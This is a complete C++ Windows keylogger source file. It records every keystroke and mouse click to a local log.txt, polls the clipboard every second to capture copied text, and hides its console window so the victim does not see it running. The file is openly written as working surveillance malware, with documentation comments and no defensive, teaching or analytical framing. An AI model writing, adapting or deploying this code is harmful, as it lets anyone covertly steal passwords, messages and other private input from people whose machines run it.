```c++
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <thread>

using namespace std;

/**
 * @brief Checks if the Caps Lock key is pressed.
 * 
 * @pre The program is running in a Windows environment.
 * @post Returns "true" if the Caps Lock key is on, "false" otherwise.
 */
bool isCapsLock() {
    return (GetKeyState(VK_CAPITAL) & 1) != 0;
}

/**
 * @brief Checks if the Shift key is pressed.
 * 
 * @pre The program is running in a Windows environment.
 * @post Returns "true" if the Shift key is pressed, "false" otherwise.
 */
bool isShift() {
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
}

/**
 * @brief Appends a string to the log file.
 * 
 * @pre The "log.txt" file is available for writing.
 * @post The input string is appended to the log file.
 */
void save(const string& input) {
    ofstream LogFile("log.txt", ios::app);

    if (LogFile.is_open()) {
        LogFile << input;
    }
}

/**
 * @brief Checks if the given ASCII value corresponds to a special key and logs it.
 * 
 * @pre A valid ASCII value is passed to the function.
 * @post Logs the special key to the log file and returns "true" if it is a special key, otherwise returns "false".
 */
bool specialKey(char key) {
    switch (key) {
        case VK_SPACE:
            save(" ");
            return true;
        case VK_RETURN:
            save("\n");
            return true;
        case VK_SHIFT:
            save("[SHIFT]");
            return true;
        case VK_BACK:
            save("[BACKSPACE]");
            return true;
        case VK_RBUTTON:
            save("[R_CLICK]");
            return true;
        case VK_LBUTTON:
            save("[L_CLICK]");
            return true;
        case VK_CAPITAL:
            save("[CAPS_LOCK]");
            return true;
        case VK_TAB:
            save("[TAB]");
            return true;
        case VK_UP:
            save("[UP_ARROW_KEY]");
            return true;
        case VK_DOWN:
            save("[DOWN_ARROW_KEY]");
            return true;
        case VK_LEFT:
            save("[LEFT_ARROW_KEY]");
            return true;
        case VK_RIGHT:
            save("[RIGHT_ARROW_KEY]");
            return true;
        case VK_CONTROL:
            save("[CONTROL]");
            return true;
        case VK_MENU:
            save("[ALT]");
            return true;
        default:
            return false;
    }
}

/**
 * @brief Gets the current text from the clipboard.
 * 
 * @return The text content of the clipboard or an empty string if unsuccessful.
 */
string getClipboardText() {
    string text = "";

    if (!OpenClipboard(nullptr)) {
        return text;
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != nullptr) {
        wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));
        if (pwszText != nullptr) {
            wstring ws(pwszText);
            text = string(ws.begin(), ws.end());
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();

    return text;
}

/**
 * @brief Monitors the clipboard for changes and logs new content.
 * 
 * @pre The clipboard is accessible.
 * @post New clipboard content is logged when it changes.
 */
void clipboardLogger() {
    string previousClipboardContent;

    while (true) {
        Sleep(1000);  // Check every second for clipboard changes

        string currentClipboardContent = getClipboardText();

        if (!currentClipboardContent.empty() && currentClipboardContent != previousClipboardContent) {
            save("\n[+]Clipboard: " + currentClipboardContent + "\n");
            previousClipboardContent = currentClipboardContent;
        }
    }
}

/**
 * @brief Logs every key that the user presses to a logfile.
 * 
 * @pre The function is running in a Windows environment with access to the console and file system.
 * @post All key presses are logged to "log.txt" until the process is terminated.
 */
void keyLogger() {
    // Hide console while executing the program.
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        Sleep(50);  // Avoid excessive CPU usage

        for (char key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == 0xFFFF8001) {  // If a key has been pressed and released
                if (!specialKey(key)) {
                    string str(1, key);  // Transforms the key into character

                    // Check if Upper or Lower case
                    if (!(isCapsLock() || isShift())) str[0] = tolower(str[0]);
                    else if (isCapsLock() && isShift()) str[0] = tolower(str[0]);

                    save(str);  // Logs the key
                }
            }
        }
    }
}

int main() {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);


    // Launch clipboard and key logger threads
    thread clipboardThread(clipboardLogger);
    thread keyLoggerThread(keyLogger);

    clipboardThread.join();
    keyLoggerThread.join();

    return 0;
}

```